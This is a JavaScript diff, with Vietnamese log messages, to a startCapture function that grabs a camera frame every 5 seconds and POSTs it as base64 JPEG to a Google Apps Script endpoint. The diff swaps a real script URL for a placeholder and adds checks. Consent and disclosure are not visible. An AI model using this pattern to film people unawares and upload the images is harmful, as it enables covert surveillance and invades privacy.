@@ -167,6 +167,12 @@ function startCapture() {
   const video = document.getElementById("video");
 
   captureInterval = setInterval(() => {
+
+    if (video.videoWidth === 0) {
+      console.log("Camera chưa sẵn sàng...");
+      return;
+    }
+
     const canvas = document.createElement("canvas");
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
@@ -174,27 +180,36 @@ function startCapture() {
     const ctx = canvas.getContext("2d");
     ctx.drawImage(video, 0, 0);
 
-canvas.toBlob((blob) => {
+    canvas.toBlob((blob) => {
 
-  const reader = new FileReader();
+      if (!blob) {
+        console.log("Không tạo được ảnh");
+        return;
+      }
 
-  reader.onloadend = async () => {
-    const base64 = reader.result.split(",")[1];
+      const reader = new FileReader();
 
-    await fetch("https://script.google.com/macros/s/AKfycbyNFdxASopkA0YGfwgxjx2iYu5rlcl3JhAon-ZIZyj5n3ohCCx8LrhWIvmVWxm9C3w/exec", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/x-www-form-urlencoded"
-      },
-      body: "data=" + base64
-    });
-  };
+      reader.onloadend = async () => {
+        const base64 = reader.result.split(",")[1];
 
-  reader.readAsDataURL(blob);
+        console.log("Đang gửi ảnh...");
 
-}, "image/jpeg", 0.6);
+        await fetch("LINK_SCRIPT_CUA_BAN", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          body: "data=" + base64
+        });
 
-  }, 5000); // 5 giây
+        console.log("Đã gửi!");
+      };
+
+      reader.readAsDataURL(blob);
+
+    }, "image/jpeg", 0.6);
+
+  }, 5000);
 }
 
 // 📤 submit
